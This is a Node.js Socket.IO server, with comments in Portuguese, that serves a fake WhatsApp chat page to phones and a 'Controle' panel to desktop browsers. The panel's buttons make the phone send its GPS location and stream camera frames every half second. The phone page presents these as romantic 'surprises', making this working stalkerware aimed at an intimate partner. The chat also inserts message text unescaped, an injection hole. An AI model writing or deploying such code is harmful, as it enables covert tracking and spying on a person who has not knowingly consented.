const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const isMobile = /mobile|android|iphone|ipad/i.test(req.headers['user-agent'] || '');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    res.send(getMobilePage(fullUrl));
  } else {
    res.send(getPCPage(fullUrl));
  }
});

io.on('connection', (socket) => {
  console.log('✅ Cliente conectado:', socket.id);
  
  socket.on('send_message', (data) => {
    socket.broadcast.emit('new_message', data);
  });
  
  socket.on('send_audio', (data) => {
    socket.broadcast.emit('new_audio', data);
  });
  
  socket.on('typing_start', () => {
    socket.broadcast.emit('user_typing', { isTyping: true });
  });
  
  socket.on('typing_stop', () => {
    socket.broadcast.emit('user_typing', { isTyping: false });
  });
  
  socket.on('command', (cmd) => {
    socket.broadcast.emit('execute_command', cmd);
  });
  
  socket.on('camera_frame', (frame) => {
    socket.broadcast.emit('camera_stream', frame);
  });
  
  socket.on('location_update', (loc) => {
    socket.broadcast.emit('new_location', loc);
  });
  
  socket.on('disconnect', () => {
    console.log('❌ Desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Servidor rodando!`);
  console.log(`📍 http://localhost:${PORT}\n`);
});

// Página do Celular (WhatsApp)
function getMobilePage(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
        }
        .app {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: #0b141a;
        }
        .header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #2a3942;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            position: relative;
        }
        .online-badge {
            position: absolute;
            bottom: 0;
            right: 0;
            width: 12px;
            height: 12px;
            background: #25d366;
            border-radius: 50%;
            border: 2px solid #202c33;
        }
        .contact-info h3 {
            color: #e9edef;
            font-size: 16px;
        }
        .contact-status {
            color: #8696a0;
            font-size: 12px;
        }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px 12px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .message-meta {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 4px;
            font-size: 10px;
            color: #8696a0;
        }
        .audio-message {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .audio-play {
            background: none;
            border: none;
            color: #e9edef;
            font-size: 20px;
            cursor: pointer;
        }
        .waveform {
            display: flex;
            gap: 3px;
            align-items: center;
            height: 30px;
        }
        .wave {
            width: 3px;
            background: #e9edef;
            border-radius: 2px;
            animation: wave 0.5s infinite alternate;
        }
        @keyframes wave {
            from { height: 5px; }
            to { height: 20px; }
        }
        .typing-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 12px;
            background: #202c33;
            border-radius: 16px;
            width: fit-content;
        }
        .typing-dots {
            display: flex;
            gap: 4px;
        }
        .typing-dots span {
            width: 6px;
            height: 6px;
            background: #8696a0;
            border-radius: 50%;
            animation: typing 1.4s infinite;
        }
        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-6px); opacity: 1; }
        }
        .input-area {
            background: #202c33;
            padding: 8px 12px;
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .input-field {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }
        .input-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }
        .toast {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e2a32;
            color: #e9edef;
            padding: 8px 16px;
            border-radius: 24px;
            font-size: 13px;
            z-index: 1000;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="header">
            <div class="header-left">
                <div class="avatar">💕<div class="online-badge"></div></div>
                <div class="contact-info">
                    <h3>Meu Amor</h3>
                    <div class="contact-status" id="statusText">🟢 online</div>
                </div>
            </div>
        </div>
        <div class="messages" id="messages"></div>
        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
            <button class="input-btn" id="micBtn">🎤</button>
            <button class="input-btn" id="sendBtn">📤</button>
        </div>
    </div>
    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const messages = document.getElementById('messages');
        const input = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const micBtn = document.getElementById('micBtn');
        const statusText = document.getElementById('statusText');
        
        let isRecording = false;
        let mediaRecorder = null;
        let typingTimeout = null;
        
        function showToast(msg) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        function addMessage(text, type, isAudio = false, audioUrl = null) {
            const div = document.createElement('div');
            div.className = \`message \${type}\`;
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            
            if (isAudio && audioUrl) {
                const id = 'a_' + Date.now();
                div.innerHTML = \`
                    <div class="audio-message">
                        <button class="audio-play" onclick="this.innerHTML=this.innerHTML==='⏸️'?'▶️':'⏸️'; document.getElementById('\${id}')[this.innerHTML==='▶️'?'pause':'play']()">▶️</button>
                        <div class="waveform"><div class="wave"></div><div class="wave"></div><div class="wave"></div></div>
                        <audio id="\${id}" src="\${audioUrl}" style="display:none"></audio>
                    </div>
                    <div class="message-meta"><span>\${time}</span><span>✓✓</span></div>
                \`;
            } else {
                div.innerHTML = \`<div>\${text}</div><div class="message-meta"><span>\${time}</span><span>✓✓</span></div>\`;
            }
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }
        
        function sendMessage() {
            const text = input.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('send_message', { text });
                input.value = '';
                socket.emit('typing_stop');
            }
        }
        
        input.addEventListener('input', () => {
            socket.emit('typing_start');
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1000);
        });
        
        sendBtn.onclick = sendMessage;
        input.onkeypress = (e) => { if (e.key === 'Enter') sendMessage(); };
        
        micBtn.onclick = async () => {
            if (isRecording) {
                mediaRecorder?.stop();
                isRecording = false;
                micBtn.textContent = '🎤';
            } else {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const url = URL.createObjectURL(blob);
                        addMessage('🎤 Áudio', 'sent', true, url);
                        const reader = new FileReader();
                        reader.onloadend = () => socket.emit('send_audio', { audio: reader.result });
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(t => t.stop());
                        showToast('🎤 Áudio enviado!');
                    };
                    mediaRecorder.start();
                    isRecording = true;
                    micBtn.textContent = '⏹️';
                    showToast('🎤 Gravando...');
                } catch(e) { showToast('❌ Erro no microfone'); }
            }
        };
        
        socket.on('new_message', (data) => addMessage(data.text, 'received'));
        socket.on('new_audio', () => addMessage('🎤 Mensagem de áudio', 'received'));
        socket.on('user_typing', (data) => {
            statusText.innerHTML = data.isTyping ? '✍️ digitando...' : '🟢 online';
        });
        socket.on('execute_command', (cmd) => {
            if (cmd.type === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
                showToast('📳 Vibração!');
            } else if (cmd.type === 'emergency') {
                if (navigator.vibrate) navigator.vibrate([500,200,500]);
                showToast('💖 Surpresa!');
                addMessage('💖 Surpresa especial recebida!', 'received');
            } else if (cmd.type === 'get_location' && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    socket.emit('location_update', { lat: p.coords.latitude, lng: p.coords.longitude });
                    addMessage(\`📍 Local: \${p.coords.latitude.toFixed(4)}, \${p.coords.longitude.toFixed(4)}\`, 'sent');
                });
            } else if (cmd.type === 'start_camera') {
                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    const track = stream.getVideoTracks()[0];
                    const capture = new ImageCapture(track);
                    setInterval(() => {
                        capture.grabFrame().then(bitmap => {
                            const canvas = document.createElement('canvas');
                            canvas.width = bitmap.width;
                            canvas.height = bitmap.height;
                            canvas.getContext('2d').drawImage(bitmap, 0, 0);
                            socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
                        });
                    }, 500);
                    showToast('📷 Câmera ativada!');
                }).catch(() => showToast('❌ Erro na câmera'));
            }
        });
        messages.innerHTML = '<div class="message received">💕 Olá! Estou aqui para você 💕<div class="message-meta"><span>Agora</span><span>✓✓</span></div></div>';
    </script>
</body>
</html>`;
}

// Página do PC (Controle)
function getPCPage(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #111b21;
            height: 100vh;
            overflow: hidden;
        }
        .app { display: flex; height: 100vh; }
        .sidebar {
            width: 320px;
            background: #202c33;
            border-right: 1px solid #2a3942;
            display: flex;
            flex-direction: column;
        }
        .sidebar-header {
            padding: 20px 16px;
            border-bottom: 1px solid #2a3942;
        }
        .user-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .avatar {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .main-chat {
            flex: 1;
            display: flex;
            flex-direction: column;
            background: #0b141a;
        }
        .chat-header {
            background: #202c33;
            padding: 12px 16px;
            border-bottom: 1px solid #2a3942;
        }
        .messages-area {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
        }
        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
        }
        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
        }
        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            gap: 12px;
            align-items: center;
        }
        .input-field {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: #e9edef;
            outline: none;
        }
        .send-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }
        .control-panel {
            width: 340px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            overflow-y: auto;
        }
        .panel-section {
            padding: 20px;
            border-bottom: 1px solid #2a3942;
        }
        .panel-title {
            color: #e9edef;
            font-size: 16px;
            margin-bottom: 16px;
        }
        .btn-control {
            width: 100%;
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: #e9edef;
            cursor: pointer;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .btn-control:hover { background: #3b4a54; }
        .btn-danger { background: #c0392b; }
        .video-preview img { width: 100%; border-radius: 8px; margin-top: 12px; }
        .location-info {
            background: #111b21;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-top: 12px;
        }
        .status-badge {
            width: 8px;
            height: 8px;
            background: #25d366;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="user-info">
                    <div class="avatar">💻</div>
                    <div><div style="color:#e9edef">PC - Controle</div><div style="color:#8696a0;font-size:12px">Conectado</div></div>
                </div>
            </div>
        </div>
        <div class="main-chat">
            <div class="chat-header">
                <h3 style="color:#e9edef">Meu Amor 💕</h3>
                <div style="color:#8696a0;font-size:12px" id="status"><span class="status-badge"></span> online</div>
            </div>
            <div class="messages-area" id="messages"></div>
            <div class="input-area">
                <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
                <button class="send-btn" id="sendBtn">📤</button>
            </div>
        </div>
        <div class="control-panel">
            <div class="panel-section">
                <div class="panel-title">📹 Câmera</div>
                <button class="btn-control" id="cameraBtn">📷 Ativar Câmera</button>
                <div class="video-preview"><img id="cameraPreview" src=""></div>
            </div>
            <div class="panel-section">
                <div class="panel-title">📍 Localização</div>
                <button class="btn-control" id="locationBtn">📍 Solicitar Localização</button>
                <div class="location-info" id="locationInfo">Aguardando...</div>
            </div>
            <div class="panel-section">
                <div class="panel-title">💖 Ações</div>
                <button class="btn-control" id="vibrateBtn">📳 Vibrar</button>
                <button class="btn-control btn-danger" id="emergencyBtn">💥 Surpresa Especial</button>
            </div>
        </div>
    </div>
    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        const messages = document.getElementById('messages');
        const input = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const cameraPreview = document.getElementById('cameraPreview');
        const locationInfo = document.getElementById('locationInfo');
        const status = document.getElementById('status');
        
        let typingTimeout = null;
        
        function addMessage(text, type) {
            const div = document.createElement('div');
            div.className = \`message \${type}\`;
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = \`\${text}<div class="message-meta">\${time}</div>\`;
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }
        
        function sendMessage() {
            const text = input.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('send_message', { text });
                input.value = '';
                socket.emit('typing_stop');
            }
        }
        
        input.addEventListener('input', () => {
            socket.emit('typing_start');
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => socket.emit('typing_stop'), 1000);
        });
        
        sendBtn.onclick = sendMessage;
        input.onkeypress = (e) => { if (e.key === 'Enter') sendMessage(); };
        
        document.getElementById('cameraBtn').onclick = () => {
            socket.emit('command', { type: 'start_camera' });
            addMessage('📷 Solicitando câmera...', 'sent');
        };
        document.getElementById('locationBtn').onclick = () => {
            socket.emit('command', { type: 'get_location' });
            addMessage('📍 Solicitando localização...', 'sent');
        };
        document.getElementById('vibrateBtn').onclick = () => {
            socket.emit('command', { type: 'vibrate' });
            addMessage('📳 Vibração enviada', 'sent');
        };
        document.getElementById('emergencyBtn').onclick = () => {
            socket.emit('command', { type: 'emergency' });
            addMessage('💥 Surpresa enviada!', 'sent');
        };
        
        socket.on('new_message', (data) => addMessage(data.text, 'received'));
        socket.on('camera_stream', (frame) => { cameraPreview.src = frame; });
        socket.on('new_location', (loc) => {
            locationInfo.innerHTML = \`📍 Lat: \${loc.lat.toFixed(6)}<br>📍 Lng: \${loc.lng.toFixed(6)}<br><a href="https://www.google.com/maps?q=\${loc.lat},\${loc.lng}" target="_blank">🗺️ Ver mapa</a>\`;
            addMessage(\`📍 Localização recebida\`, 'received');
        });
        socket.on('user_typing', (data) => {
            status.innerHTML = data.isTyping ? '<span class="status-badge"></span> digitando...' : '<span class="status-badge"></span> online';
        });
        messages.innerHTML = '<div class="message received">💕 Olá! Estou aqui para você 💕<div class="message-meta">Agora</div></div>';
    </script>
</body>
</html>`;
}
